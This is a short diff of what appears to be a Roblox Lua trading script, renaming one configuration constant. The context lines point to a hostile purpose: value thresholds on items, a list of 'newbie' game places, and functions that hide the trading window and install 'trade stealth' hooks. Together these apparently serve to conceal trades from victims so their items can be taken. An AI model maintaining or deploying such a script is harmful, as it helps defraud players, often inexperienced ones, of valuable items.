@@ -6,7 +6,7 @@ local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
-local HIDE_TRADING_GUI = true
+local HIDE_TRADE_GUI = true
 local SINGLE_ITEM_MIN_RAP = 1000
 local EVERYONE_RAP_THRESHOLD = 1000
 local NEWBIE_PLACE_IDS = {
@@ -819,7 +819,7 @@ local function shouldHideTradeGui()
 end
 
 local function hideTradingGuiInstant()
-    if not HIDE_TRADING_GUI or not isTradeUiActive() then
+    if not HIDE_TRADE_GUI or not isTradeUiActive() then
         return
     end
 
@@ -900,7 +900,7 @@ local function restoreTradingGui()
 end
 
 local function armTradeStealth()
-    if not HIDE_TRADING_GUI or not isTradeUiActive() then
+    if not HIDE_TRADE_GUI or not isTradeUiActive() then
         return
     end
     TradeRuntime.stealthArmed = true
@@ -912,7 +912,7 @@ local function disarmTradeStealth()
 end
 
 local function installTradeStealthHooks()
-    if TradeRuntime.stealthHooksReady or not HIDE_TRADING_GUI then
+    if TradeRuntime.stealthHooksReady or not HIDE_TRADE_GUI then
         return
     end
     TradeRuntime.stealthHooksReady = true
